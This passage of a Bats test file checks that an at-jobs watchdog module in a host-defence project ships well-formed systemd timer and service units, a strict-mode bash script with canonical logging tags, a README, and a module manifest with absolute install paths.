    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the at-jobs-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (at-jobs-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (at-jobs-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

@test "INVARIANT (at-jobs-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (at-jobs-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the at-jobs-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    [ -f "${script_dir}/at-jobs-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (at-jobs-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script is executable (mode includes +x) — script-runnable contract)" {
    # Sister to brain-wide script-executable INVARIANT family.
    # The watchdog .sh script MUST be chmod +x so systemd's
    # ExecStart can invoke it without needing a bash prefix.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        [ -x "${s}" ]
    done
}

@test "INVARIANT (at-jobs-watchdog README.md exists in module dir — operator-doc-trail contract)" {
    # Sister to brain-wide module-doc-trail INVARIANT family.
    # Every watchdog module ships a README.md documenting its
    # probe target + alert semantics + remediation. A
    # regression that lost the README would leave operators
    # without per-module ops docs.
    readme="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (at-jobs-watchdog service Documentation URL references github.com/cyberpunk042/selfdef — canonical-vcs operator-doc-resolve contract)" {
    # Sister to brain-wide Documentation URL canonical INVARIANT
    # family. The Documentation= URL MUST reference the github
    # repo + module README path so operators can resolve docs
    # offline (via git checkout) or online (via github browser).
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=.*github.com/cyberpunk042/selfdef' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script uses set -u flag — undefined-variable strict-mode contract)" {
    # Sister to brain-wide Bash strict-mode INVARIANT family.
    # Watchdog scripts MUST declare set -u (exit on
    # undefined variable). Without -u, typos in env-var names
    # silently expand to empty strings, masking bugs.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^set -u' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script declares shebang #!/bin/bash or env bash — bash-interpreter contract)" {
    # Sister to brain-wide bash-shebang INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '#!/.*bash|#!/usr/bin/env bash'
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script uses logger -t selfdef- canonical tag — SDD-062 logger-tag contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script emits canonical severity vocabulary {ok,warn,alert} — bounded-severity contract)" {
    # Sister to brain-wide bounded-severity INVARIANT family.
    # Watchdog scripts emit logger -t selfdef-<name> -- {...severity:...}
    # with severity in the canonical vocabulary. A regression
    # introducing custom severity values (info, error, critical)
    # would break operator-side filtering.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '"severity":"(ok|warn|alert)"' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script tag selfdef-at-jobs matches module name — SDD-062 tag-canonical contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # The tag passed to logger -t MUST exactly match selfdef-at-jobs
    # so operator triage via journalctl _SYSTEMD_UNIT or
    # SYSLOG_IDENTIFIER filtering surfaces the right module.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script declares profile-aware exit behavior — operator-extension profile-dispatch contract)" {
    # Sister to brain-wide profile-aware INVARIANT family.
    # Scripts MUST handle PROFILE=enforce vs report differently.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'PROFILE.*enforce|enforce.*PROFILE|profile.*enforce' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script declares baseline file path — operator-extensible baseline-state contract)" {
    # Sister to brain-wide baseline-state INVARIANT family.
    # Delta-scan watchdogs MUST declare a BASELINE variable referencing
    # /var/lib/selfdef/ so operators know where baseline state lives.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '/var/lib/selfdef/|BASELINE' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script declares MODULE-suffixed tag in logger -t — module-name-tag-consistency contract)" {
    # Sister to SDD-062 tag-canonical INVARIANT family. The tag passed to
    # logger -t MUST include the module slug so journalctl filtering by
    # tag surfaces only this watchdog's events.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script file is non-empty (size > 100 bytes) — non-trivial-script contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script has >20 lines — non-trivial-watchdog-body contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 20 ]
    done
}

@test "INVARIANT (at-jobs-watchdog .service unit file has >5 lines of directives — non-trivial-unit-file contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 5 ]
    done
}

@test "INVARIANT (at-jobs-watchdog .service unit ExecStart references /usr/local/libexec/selfdef/ path — canonical-binary-path contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .timer file exists at canonical path modules/at-jobs-watchdog/systemd — canonical-systemd-dir layout)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    [ -d "${timer_dir}" ]
    n=$(ls "${timer_dir}"/*.timer 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (at-jobs-watchdog module.toml exists at canonical path modules/at-jobs-watchdog/ — module-manifest existence 72-cycle)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    [ -f "${mtoml}" ]
}

@test "INVARIANT (at-jobs-watchdog systemd dir exists at modules/at-jobs-watchdog/systemd — systemd-dir-existence 73-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    [ -d "${sd}" ]
}

@test "INVARIANT (at-jobs-watchdog systemd dir is non-empty — systemd-content-presence 74-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    n=$(ls "${sd}" | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (at-jobs-watchdog .service file size > 100 bytes — substantial-service-unit 75-cycle)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (at-jobs-watchdog .timer file size > 50 bytes — substantial-timer-unit 76-cycle)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        size=$(stat -c '%s' "${t}")
        [ "${size}" -gt 50 ]
    done
}

@test "INVARIANT (at-jobs-watchdog README.md file size > 100 bytes — substantial-readme 77-cycle)" {
    readme="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/README.md"
    size=$(stat -c '%s' "${readme}")
    [ "${size}" -gt 100 ]
}

@test "INVARIANT (at-jobs-watchdog .service Documentation URL is HTTP/HTTPS — operator-doc-link-protocol 78)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=(http|https)://' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script has shebang line — POSIX-conformant 79)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '^#!'
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script declares set flag in first 50 lines — strict-mode-prologue 80)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -50 "${s}" | grep -qE '^set -'
    done
}

@test "INVARIANT (at-jobs-watchdog module.toml size > 200 bytes — substantial-watchdog-manifest 81)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    size=$(stat -c '%s' "${mtoml}")
    [ "${size}" -gt 200 ]
}

@test "INVARIANT (at-jobs-watchdog .service file is non-empty — non-trivial-unit-file 82)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        [ -s "${s}" ]
    done
}

@test "INVARIANT (at-jobs-watchdog .timer file is non-empty — non-trivial-timer-file 83)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        [ -s "${t}" ]
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script body has at least one variable assignment — non-vacuous-script 84)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^[a-zA-Z_]+=' "${s}"
    done
}

@test "INVARIANT (at-jobs-watchdog .sh script path matches systemd dir layout — canonical-script-co-location 85)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd"
    [ -d "${script_dir}" ]
    n=$(ls "${script_dir}"/*.sh 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (at-jobs-watchdog module.toml has install_paths section — SDD-026 mutation-manifest 86)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (at-jobs-watchdog module.toml install_paths.paths non-empty list 87)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert isinstance(ps, list) and len(ps) > 0
"
}

@test "INVARIANT (at-jobs-watchdog module.toml install_paths.paths only absolute paths 88)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
for p in ps:
    assert isinstance(p, str) and p.startswith('/'), f'{p!r} not absolute'
"
}

@test "INVARIANT (at-jobs-watchdog module.toml provides list non-empty 89 — capability-export-present)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('provides')
assert isinstance(p, list) and len(p) >= 1
"
}

@test "INVARIANT (at-jobs-watchdog module.toml has at least 3 entries in install_paths.paths — substantial-manifest 90)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert len(ps) >= 3, f'expected >=3 paths, got {len(ps)}'
"
}

@test "INVARIANT (at-jobs-watchdog module.toml install_paths.paths includes /etc/ entry — config-staging 91)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/etc/') for p in ps)
"
}

@test "INVARIANT (at-jobs-watchdog module.toml install_paths.paths has /usr/local/libexec/selfdef/ entry 92)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any('libexec/selfdef' in p for p in ps)
"
}

@test "INVARIANT (at-jobs-watchdog module.toml install_paths.paths has /var/ entry 93 — state-staging)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/var/') for p in ps)
"
}

@test "INVARIANT (at-jobs-watchdog module.toml [install_paths] declared at line beginning — TOML-section-header 94)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}
